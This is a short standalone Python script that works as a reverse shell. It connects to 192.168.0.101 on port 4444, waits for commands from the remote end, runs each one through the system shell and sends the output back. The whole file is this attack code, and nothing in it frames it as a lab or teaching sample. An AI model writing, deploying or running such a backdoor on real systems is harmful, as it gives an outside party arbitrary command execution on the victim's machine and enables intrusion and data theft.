import socket, subprocess


socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.connect(("192.168.0.101", 4444))
while True:
    command = socket.recv(1024).decode()
    print(command)
    output = subprocess.getoutput(command)
    socket.send(output.encode())
socket.close()